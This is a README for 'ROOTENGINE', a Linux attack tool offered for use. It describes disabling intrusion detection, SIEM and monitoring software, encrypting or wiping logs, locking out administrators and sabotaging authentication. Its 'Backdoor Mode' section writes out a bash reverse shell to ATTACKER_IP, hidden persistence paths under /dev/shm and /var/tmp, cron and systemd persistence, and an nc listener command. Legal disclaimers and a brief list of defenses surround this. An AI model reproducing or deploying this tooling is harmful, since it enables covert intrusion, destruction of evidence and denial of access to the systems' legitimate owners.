# ROOTENGINE

Advanced Linux system lockdown tool with security monitoring neutralization capabilities.

**Author:** @rafok2v9c

---

## Example Session

```bash
$ sudo ./rootengine.sh

██████╗  ██████╗  ██████╗ ████████╗███████╗███╗   ██╗ ██████╗ ██╗███╗   ██╗███████╗
██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝██╔════╝████╗  ██║██╔════╝ ██║████╗  ██║██╔════╝
██████╔╝██║   ██║██║   ██║   ██║   █████╗  ██╔██╗ ██║██║  ███╗██║██╔██╗ ██║█████╗  
██╔══██╗██║   ██║██║   ██║   ██║   ██╔══╝  ██║╚██╗██║██║   ██║██║██║╚██╗██║██╔══╝  
██║  ██║╚██████╔╝╚██████╔╝   ██║   ███████╗██║ ╚████║╚██████╔╝██║██║ ╚████║███████╗
╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝╚══════╝

Select execution mode:

1) Aggressive Mode - Maximum Lockdown
2) Backdoor Mode - Attacker Access Preserved

Enter your choice (1 or 2): _
```

---

## DISCLAIMER

**THIS TOOL IS FOR EDUCATIONAL AND AUTHORIZED SECURITY TESTING ONLY.**

* Use ONLY in controlled test environments, VMs, or authorized systems
* Authors are NOT responsible for any damage, data loss, or legal consequences
* Unauthorized use may be ILLEGAL in your jurisdiction
* You accept FULL RESPONSIBILITY for your actions

**WARNING: Makes IRREVERSIBLE system modifications. Always create snapshots before running.**

---

## SECURITY WARNING

**CRITICAL LEGAL NOTICE:**

* **Authorized Use Only** - Use ONLY on systems you own or have written authorization
* **Criminal Offense** - Unauthorized use = violation of computer fraud laws
* **Possible Penalties** - Heavy fines, prison sentences, civil liability
* **No Warranty** - Software provided "AS IS" with no liability for damages
* **Full Responsibility** - By using this tool, you accept ALL consequences

**Laws to Consider:**
* United States: Computer Fraud and Abuse Act (CFAA)
* European Union: Computer Misuse Act, GDPR
* United Kingdom: Computer Misuse Act 1990
* Check your local cybercrime legislation

---

## Overview

ROOTENGINE neutralizes security monitoring solutions while maintaining web service availability. Advanced system lockdown with dual operating modes.

### Key Features

* IDS/IPS neutralization (Snort, Suricata, Zeek, Fail2ban)
* SIEM/SOAR disruption (Splunk, Elastic, QRadar, Graylog)
* Monitoring shutdown (Nagios, Zabbix, Prometheus, Datadog)
* Log encryption/deletion
* Admin access blocking (SSH, FTP, console)
* Web service protection (Apache, Nginx, Lighttpd)
* Multiple persistence mechanisms

---

## Compatibility

### Supported OS

* Ubuntu, Debian, Fedora, Linux Mint
* Arch Linux, Manjaro, openSUSE
* Pop!_OS, Kali Linux, AlmaLinux

### Requirements

* Root/sudo access
* Bash 4.0+

---

## Installation

```bash
git clone https://github.com/yourusername/rootengine.git
cd rootengine
chmod +x rootengine.sh
```

---

## Usage

### Basic Usage

```bash
# Show help
sudo ./rootengine.sh --help

# Run interactive mode
sudo ./rootengine.sh
```

---

## Operating Modes

### Mode 1: Aggressive (Maximum Lockdown)

Complete system lockdown with maximum restrictions.

**What happens:**
* All security monitoring neutralized
* User accounts isolated
* Terminals destroyed
* System binaries sabotaged
* Authentication broken
* Display backlight disabled
* Web services protected and running

**Result:** System totally locked, only web accessible from outside.

---

### Mode 2: Backdoor (Attacker Access)

System lockdown while maintaining backdoor access.

**What happens:**
* Security monitoring neutralized
* Admin access blocked (for legitimate users)
* Logs encrypted/deleted
* Web services protected
* Backdoor shells established

**Backdoor Details:**
* Bash reverse shell: `bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1`
* Hidden locations:
  * `/.cache/.system/update.sh`
  * `/var/tmp/.x11/update.sh`
  * `/dev/shm/.config/update.sh`
* Persistence: Crontab + Systemd + @reboot
* Auto-reconnect every 60 seconds

**Configuration:**
* Provide attacker IP address
* Provide listening port

**Listener setup:**
```bash
nc -lvnp PORT
```

---

## Technical Highlights

### Web Server Protection

**Guaranteed uptime for:**
* Apache2, Nginx, Httpd, Lighttpd, PHP-FPM

**Protection mechanisms:**
* Real-time priority (nice -20, ionice RT, chrt FIFO 99)
* OOM killer immunity (score -1000)
* Watchdog monitoring (5-second checks)
* Auto-restart on failure
* Port monitoring (80/443)

### Security Tool Neutralization

**IDS/IPS:** Snort, Suricata, Zeek, Fail2ban, Tripwire, AIDE  
**SIEM:** Splunk, Elastic Stack, QRadar, ArcSight, Graylog  
**Monitoring:** Nagios, Zabbix, Prometheus, Grafana, Datadog

### Log Management

* AES-256-CBC encryption with random keys
* Deletion fallback if no openssl
* All system logs, audit, history cleared
* Journal vacuumed

---

## Detection & Mitigation

### Can be Detected By:

* Network traffic analysis (backdoor connections)
* Out-of-band monitoring
* Physical/console access
* Hypervisor inspection (for VMs)
* External SIEM/IDS

### Defense Recommendations:

* Regular system snapshots
* Out-of-band monitoring
* Network segmentation
* Read-only system partitions
* External log collection

---

## Ethical Guidelines

**DO:**
* Test in isolated VMs only
* Maintain backups/snapshots
* Get written authorization
* Document activities

**DON'T:**
* Use on production systems
* Deploy without authorization
* Use for malicious purposes
* Violate laws

---

## Contributing

**Accepted:**
* Bug fixes
* Compatibility improvements
* Documentation updates

**NOT Accepted:**
* Malicious feature additions
* Safety mechanism removal
* Warning/disclaimer removal

---

**Restrictions:**
* No illegal use
* No production deployment without authorization
* Must include all disclaimers

---

## Support

* Give us a star on GitHub

**Use responsibly and legally.**
